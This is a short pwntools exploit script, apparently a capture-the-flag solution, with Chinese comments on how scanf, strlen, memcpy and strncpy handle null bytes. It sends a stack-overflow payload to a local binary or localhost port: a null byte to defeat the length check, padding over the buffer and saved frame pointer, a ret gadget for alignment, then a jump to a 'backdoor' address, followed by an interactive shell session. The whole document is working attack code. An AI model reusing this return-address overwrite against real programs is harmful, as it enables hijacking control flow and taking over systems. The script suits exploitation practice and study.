from pwn import *

context(arch='amd64',os='linux',log_level='debug',endian='little')

p = process('./pwn')
p = remote('127.0.0.1',61234)

# scanf 读入255字节字符串
# len 使用 strlen 计算 遇到 \0 结束
# memcpy 精确复制n字节, 包括 \0
# strncpy 最多复制n字节, 遇到 \0 停止
# payload = 'meow' + \x00 + 'a'*(0x20-5) + 'a'*8 + backdoor

backdoor = 0x401236
ret = 0x40124F
# 使用ret栈对齐
payload = b'meow\x00' + b'a'*(0x20-5) + b'a'*8 + p64(ret) + p64(backdoor)

p.recvuntil(b'ay?\n')
p.sendline(payload)
p.recvuntil(b'it?\n')
p.sendline(b'255')

p.interactive()